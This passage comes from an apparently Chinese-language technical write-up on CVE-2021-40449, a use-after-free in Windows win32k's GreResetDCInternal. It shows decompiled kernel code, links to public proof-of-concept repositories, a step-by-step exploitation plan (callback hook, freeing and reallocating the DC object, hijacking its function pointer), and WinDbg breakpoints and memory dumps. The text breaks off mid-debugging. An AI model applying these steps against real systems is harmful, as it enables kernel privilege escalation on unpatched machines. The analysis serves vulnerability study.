style="display:flex;"><span><span style="color:#75715e"/> v6<span style="color:#f92672">=</span> v13;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v13 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">2584</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> DCOBJ<span style="color:#f92672">::</span><span style="color:#a6e22e">DCOBJ</span>((DCOBJ<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v24, v13);</span></span><span style="display:flex;"><span> v14<span style="color:#f92672">=</span> (_QWORD<span style="color:#f92672">*</span>)v24;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v24 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v12 )</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v24<span style="color:#f92672">+</span><span style="color:#ae81ff">120</span>)<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v24<span style="color:#f92672">+</span><span style="color:#ae81ff">116</span>);</span></span><span style="display:flex;"><span> v14[<span style="color:#ae81ff">308</span>]<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">2464</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">2464</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v14[<span style="color:#ae81ff">309</span>]<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">2472</span>);</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v25<span style="color:#f92672">+</span><span style="color:#ae81ff">2472</span>)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v15<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(_QWORD, _QWORD))(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">2768</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v15 )</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v15</span>(<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v10<span style="color:#f92672">+</span><span style="color:#ae81ff">1824</span>),<span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(v14[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">+</span><span style="color:#ae81ff">1824</span>i64));</span></span><span style="display:flex;"><span><span style="color:#a6e22e">GreAcquireHmgrSemaphore</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LOBYTE</span>(v23)<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HmgSwapLockedHandleContents</span>(v3,<span style="color:#ae81ff">0</span>i64, v6,<span style="color:#ae81ff">0</span>i64, v23);<span style="color:#75715e">// 交换旧的和新的HDC对象</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">GreReleaseHmgrSemaphore</span>();</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">·······</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 删除HDC句柄对应的DC对象。</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">bDeleteDCInternal</span>(v6,<span style="color:#ae81ff">1</span>i64,<span style="color:#ae81ff">0</span>i64);</span></span></code></pre></div><p>如果在释放DC对象之后，重新申请DC对象空间，修改里面的函数指针内容，并通过某些步骤，让内核执行DC对象内的函数指针，即可达到<strong>use步骤</strong>让内核执行任意内核函数。</p><h3 id="漏洞利用分析">漏洞利用分析</h3><p>POC:<a href="https://github.com/KaLendsi/CVE-2021-40449-Exploit" target="_blank">https://github.com/KaLendsi/CVE-2021-40449-Exploit</a></p><p>POC代码分析：<a href="https://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp" target="_blank">https://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp</a></p><p>要利用该漏洞，难点在于free DC对象之后怎么使得内核再次调用DC对象的函数指针，在正常GreResetDCInternal函数流程中，是先调用DC对象的函数指针再删除这个对象，即按照正常流程即不会有use-after-free的条件。</p><p>在ring 3层调用ResetDC函数会通过系统调用进入内核调用函数NtGdiResetDC，在NtGdiResetDC会调用漏洞函数GreResetDCInternal，在GreResetDCInternal中会调用DC对象里面的函数指针。要利用该漏洞即要在调用函数指针之前完成三步动作：<strong>1、释放DC对象2、重新申请原DC对象的内存空间3、完成内存空间的布局</strong>。</p><p>在函数<strong>GreResetDCInternal</strong>调用DC对象的函数指针之前会调用<strong>win32kbase!hdcOpenDCW</strong>函数。<strong>win32kbase!hdcOpenDCW</strong>函数会执行打印机驱动的用户态回调函数表里面的函数，该表里面存放了函数指针，该函数指针原先指向的是预定义的回调函数。在POC中覆盖这个函数指针，使其执行POC定义的回调函数。</p><p>在自定义回调函数中再次执行ResetDC函数并传入同一HDC句柄，则会再次执行NtGdiResetDC和GreResetDCInternal函数，而在GreResetDCInternal的后半段，会释放传入的HDC对应的DC对象并创建新的DC对象。<strong>此时达到了free步骤</strong>。</p><p>在第二次ResetDC调用完成后，原DC对象已被释放，此时可以重新申请原DC对象的内存空间并完成内存布局，将原DC对象的函数指针和函数指针的参数的位置设置为想要执行的内核函数的地址及参数。在执行完第一次回调之后，GreResetDCInternal 将调用原DC对象内的函数指针，即完成了任意内核函数调用，<strong>此时达到了use步骤</strong>。</p><p>完整调用链如下图：</p><p><img alt="调用链" src="/images/vulnerability/CVE-2021-40449-analyse.assets/%E6%B5%81%E7%A8%8B%E5%9B%BE.jpg"/></p><p>其中漏洞相关的类定义如下，参考https://github.com/ZoloZiak/WinNT4/blob/master/private/ntos/w32/ntgdi/gre/dcobj.hxx#L97</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">DCLEVEL</span></span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span> ...</span></span><span style="display:flex;"><span> HDC hdcSave;</span></span><span style="display:flex;"><span> ...</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">DC</span><span style="color:#f92672">:</span><span style="color:#66d9ef">public</span> OBJECT</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span> DHPDEV dhpdev_;</span></span><span style="display:flex;"><span> PDEV<span style="color:#f92672">*</span>ppdev_;</span></span><span style="display:flex;"><span> ...</span></span><span style="display:flex;"><span> HDC hdcNext_;<span style="color:#75715e">// HDC链表指针</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> HDC hdcPrev_;</span></span><span style="display:flex;"><span> ...</span></span><span style="display:flex;"><span> DCLEVEL dclevel</span></span><span style="display:flex;"><span> ...</span></span><span style="display:flex;"><span>};</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> DC<span style="color:#f92672">*</span>PDC;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">XDCOBJ</span><span style="color:#75715e">/* dco */</span></span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span> PDC pdc;</span></span><span style="display:flex;"><span> ...</span></span><span style="display:flex;"><span>};</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> XDCOBJ<span style="color:#f92672">*</span>PXDCOBJ;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">DCOBJ</span><span style="color:#f92672">:</span><span style="color:#66d9ef">public</span> XDCOBJ<span style="color:#75715e">/* mdo */</span></span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span> DCOBJ() { pdc<span style="color:#f92672">=</span> (PDC) NULL; }</span></span><span style="display:flex;"><span> DCOBJ(HDC hdc) { vLock(hdc); }</span></span><span style="display:flex;"><span><span style="color:#f92672">~</span>DCOBJ() { vUnlockNoNullSet(); }</span></span><span style="display:flex;"><span>};</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> DCOBJ<span style="color:#f92672">*</span>PDCOBJ;</span></span></code></pre></div><p>类之间的关系可以简化为下图：</p><p><img alt="对象关系图" src="/images/vulnerability/CVE-2021-40449-analyse.assets/%E5%AF%B9%E8%B1%A1%E5%85%B3%E7%B3%BB%E5%9B%BE.jpg"/></p><h3 id="调试">调试</h3><h4 id="free部分">free部分</h4><p>在free部分需要把我们想要释放的内存空间释放，并让后面的use部分成功申请到这块内存空间。</p><p>调试环境：虚拟机windows 10 1607、物理机windows 10 2004</p><p>POC:<a href="https://github.com/KaLendsi/CVE-2021-40449-Exploit" target="_blank">https://github.com/KaLendsi/CVE-2021-40449-Exploit</a></p><p>断点:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">bp</span><span style="color:#a6e22e">win32kfull</span><span style="color:#f92672">!</span><span style="color:#a6e22e">NtGdiResetDC</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">bp</span><span style="color:#a6e22e">win32kfull</span><span style="color:#f92672">!</span><span style="color:#a6e22e">NtGdiResetDC</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0xc1</span><span style="color:#e6db74">"调用GreResetDCInternal函数"</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">bp</span><span style="color:#a6e22e">win32kfull</span><span style="color:#f92672">!</span><span style="color:#a6e22e">GreResetDCInternal</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x3a</span><span style="color:#e6db74">"调用DCOBJ构造函数"</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">bp</span><span style="color:#a6e22e">win32kfull</span><span style="color:#f92672">!</span><span style="color:#a6e22e">GreResetDCInternal</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x116</span><span style="color:#e6db74">"调用_imp_hdcOpenDCW函数"</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">bp</span><span style="color:#a6e22e">win32kfull</span><span style="color:#f92672">!</span><span style="color:#a6e22e">GreResetDCInternal</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x136</span><span style="color:#e6db74">"第二次DCOBJ"</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">bp</span><span style="color:#a6e22e">win32kfull</span><span style="color:#f92672">!</span><span style="color:#a6e22e">GreResetDCInternal</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x1b5</span><span style="color:#e6db74">"调用DC对象函数指针"</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">bp</span><span style="color:#a6e22e">win32kfull</span><span style="color:#f92672">!</span><span style="color:#a6e22e">GreResetDCInternal</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d1</span><span style="color:#e6db74">"调用HmgSwapLockedHandle函数"</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">bp</span><span style="color:#a6e22e">win32kfull</span><span style="color:#f92672">!</span><span style="color:#a6e22e">GreResetDCInternal</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x20d</span><span style="color:#e6db74">"调用_imp_bDeleteDCInternal函数"</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">bp</span><span style="color:#a6e22e">cve_2021_40449</span><span style="color:#f92672">!</span><span style="color:#a6e22e">hook_DrvEnablePDEV</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x12a</span><span style="color:#e6db74">"循环调用"</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">bp</span><span style="color:#a6e22e">win32kbase</span><span style="color:#f92672">!</span><span style="color:#a6e22e">PALMEMOBJ</span><span style="color:#f92672">::</span><span style="color:#a6e22e">bCreatePalette</span><span style="color:#e6db74">"调用win32kbase!PALMEMOBJ::bCreatePalette"</span></span></span></code></pre></div><p>运行POC，断点<code>bp win32kfull!NtGdiResetDC</code>触发此时传入的句柄为<code>rcx=00000000092105f1</code></p><p><img alt="NtGdiResetDC" src="/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110112401943.png"/></p><p>第一次调用<code>win32kfull!GreResetDCInternal</code> 时传入各个参数为<code>rcx=00000000092105f1</code><code>rdx=0000000000000000</code><code>r8=ffffb101aadf2a44</code> 即第一个句柄值为<code>00000000092105f1</code></p><p><img alt="image-20211110143416643" src="/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110143416643.png"/></p><p>第一次调用构造函数，利用DC对象创建DCO对象，此时rbx存放DCO对象的地址，</p><p><img alt="image-20211110151223865" src="/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110151223865.png"/></p><p>根据<strong>漏洞形成分析</strong>的计算公式，可以很方便的得到DC对象内的函数指针指向的函数的地址为：<code>ffffd548a1f10c30</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq rax</span></span><span style="display:flex;"><span>ffffb101<span style="color:#960050;background-color:#1e0010">`</span>aadf29c0 ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d010<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000001</span></span></span><span style="display:flex;"><span>ffffb101<span style="color:#960050;background-color:#1e0010">`</span>aadf29d0<span style="color:#ae81ff">0000026</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6e766</span>b20<span style="color:#ae81ff">000000</span>d7<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">97</span>aff680</span></span><span style="display:flex;"><span>ffffb101<span style="color:#960050;background-color:#1e0010">`</span>aadf29e0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">092105f</span><span style="color:#ae81ff">1</span></span></span><span style="display:flex;"><span>ffffb101<span style="color:#960050;background-color:#1e0010">`</span>aadf29f0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span> ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>b030</span></span><span style="display:flex;"><span>ffffb101<span style="color:#960050;background-color:#1e0010">`</span>aadf2a00 ffffb101<span style="color:#960050;background-color:#1e0010">`</span>aadf2b80 ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f18fe6</span></span><span style="display:flex;"><span>ffffb101<span style="color:#960050;background-color:#1e0010">`</span>aadf2a10<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000001</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffb101<span style="color:#960050;background-color:#1e0010">`</span>aadf2a20 ffffb101<span style="color:#960050;background-color:#1e0010">`</span>aadf2a44 ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>b030</span></span><span style="display:flex;"><span>ffffb101<span style="color:#960050;background-color:#1e0010">`</span>aadf2a30<span style="color:#ae81ff">000000</span>d7<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">97</span>aff5d0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// rbx存放了构造函数产生的DCO对象地址</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq rbx</span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d010<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">092105f</span><span style="color:#ae81ff">1</span><span style="color:#ae81ff">80000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d020 ffffd800<span style="color:#960050;background-color:#1e0010">`</span>b45ad780<span style="color:#ae81ff">0000026</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">6e75</span>ea10</span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d030<span style="color:#ae81ff">00100010</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d040 ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00052030</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d050 ffffd800<span style="color:#960050;background-color:#1e0010">`</span>b56f1260<span style="color:#ae81ff">0000000</span><span style="color:#ae81ff">9</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">1000</span>a01f</span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d060 ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d3d0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">88000</span>b</span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d070 ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">000004f</span><span style="color:#ae81ff">0</span> ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00005</span>d90</span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d080<span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ffffd50e`041fd010为rbx的值，此处ffffd50e`041fd010+0x30为PDC的地址，PDC指向DC对象即DC对象地址为ffffd50e`00052030</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 计算公式 *(dco地址+0x30)=dc地址</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d010<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span></span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d040 ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00052030</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d050 ffffd800<span style="color:#960050;background-color:#1e0010">`</span>b56f1260<span style="color:#ae81ff">0000000</span><span style="color:#ae81ff">9</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">1000</span>a01f</span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d060 ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d3d0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">88000</span>b</span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d070 ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">000004f</span><span style="color:#ae81ff">0</span> ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00005</span>d90</span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d080<span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d090<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d0a0 ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00001</span>a10 ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00004</span>cb0</span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d0b0 ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">000105f</span><span style="color:#ae81ff">0</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ffffd50e`00052030+0xad0处为DC对象的函数指针，该指针指向了一个函数</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 计算公式 *(dc地址 +0xad0)=函数地址</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00052030</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0xad0</span></span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00052</span>b00 ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c30 ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1db18c0</span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00052</span>b10<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00052</span>b20<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span> ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10930</span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00052</span>b30<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span> ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f11dc0</span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00052</span>b40 ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f0e6b0 ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f11b00</span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00052</span>b50<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span> ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f0cd70</span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00052</span>b60 ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f0d1f0 ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f112f0</span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00052</span>b70<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 以下为函数的汇编</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> u ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c30</span></span><span style="display:flex;"><span>win32kfull<span style="color:#f92672">!</span>UMPDDrvResetPDEV:</span></span><span style="display:flex;"><span>ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c30<span style="color:#ae81ff">48895</span>c2418 mov qword ptr [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h],rbx</span></span><span style="display:flex;"><span>ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c35<span style="color:#ae81ff">4889742420</span> mov qword ptr [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>h],rsi</span></span><span style="display:flex;"><span>ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c3a<span style="color:#ae81ff">57</span> push rdi</span></span><span style="display:flex;"><span>ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c3b<span style="color:#ae81ff">4883</span>ec70 sub rsp,<span style="color:#ae81ff">70</span>h</span></span><span style="display:flex;"><span>ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c3f<span style="color:#ae81ff">488</span>b05ba440800 mov rax,qword ptr [win32kfull<span style="color:#f92672">!</span><span style="color:#a6e22e">_security_cookie</span> (ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f95100)]</span></span><span style="display:flex;"><span>ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c46<span style="color:#ae81ff">4833</span>c4 xor rax,rsp</span></span><span style="display:flex;"><span>ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c49<span style="color:#ae81ff">4889442468</span> mov qword ptr [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">68</span>h],rax</span></span><span style="display:flex;"><span>ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c4e<span style="color:#ae81ff">488</span>bf9 mov rdi,rcx</span></span></code></pre></div><p>之后通过hdcOpenDCW函数调用用户模式的回调函数，在回调函数中再次调用ResetDC函数，此时传入的HDC和第一次调用ResetDC的是同一个句柄。</p><p><img alt="image-20211110161002502" src="/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110161002502.png"/></p><p>第二次调用<code>win32kfull!GreResetDCInternal</code> 时，传入同一个HDC句柄，即对应同一个DC对象。</p><pre tabindex="0"><code>0: kd> t
win32kfull!GreResetDCInternal:
ffffd548`a1f03e58 488bc4 mov rax,rsp
1: kd> rrcx
